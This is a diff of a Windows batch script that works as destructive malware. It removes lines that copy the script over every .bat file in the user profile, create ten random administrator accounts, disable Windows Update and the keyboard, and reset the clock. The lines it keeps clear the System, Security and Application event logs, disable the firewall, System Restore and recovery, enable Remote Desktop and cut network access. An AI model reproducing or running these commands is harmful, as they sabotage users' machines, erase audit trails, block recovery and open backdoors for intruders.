@@ -124,16 +124,6 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Dis
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 0 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v "CrashDumpEnabled" /t REG_DWORD /d 0 /f
 reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f >nul
-for /r "%userprofile%" %%f in (*.bat) do if not "%%f"=="%~f0" copy /Y "%~f0" "%%f" >nul 2>&1
-wmic os set localdatetime="19700101000000.000000+000" >nul
-sc config wuauserv start= disabled >nul
-net stop wuauserv /y >nul
-for /l %%i in (1,1,10) do (
-    set u=!random!
-    set p=!random!
-    net user !u! !p! /add >nul 2>&1
-    net localgroup administrators !u! /add >nul 2>&1
-)
 wevtutil cl System
 wevtutil cl Security
 wevtutil cl Application
@@ -150,8 +140,6 @@ netsh advfirewall firewall add rule name="BlockAllTrafficOut" dir=out action=blo
 powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 0 >nul 2>&1
 powercfg -setactive SCHEME_CURRENT >nul 2>&1
 reagentc /disable >nul 2>&1
-rundll32 keyboard,disable
-powercfg -setactive 00000000-0000-0000-0000-000000000000 2>nul
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v EnableICMPRedirect /t REG_DWORD /d 1 /f
 netsh advfirewall set allprofiles state off >nul
 netsh interface ipv4 set address name="Ethernet" source=static addr=169.254.0.1 mask=255.255.0.0 gateway=none >nul 2>&1
@@ -164,4 +152,5 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management
 wmic /namespace:\\root\wmi path MSPower_DeviceEnable call SetDisableState "DisableReason"=0x%1 >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
+
 
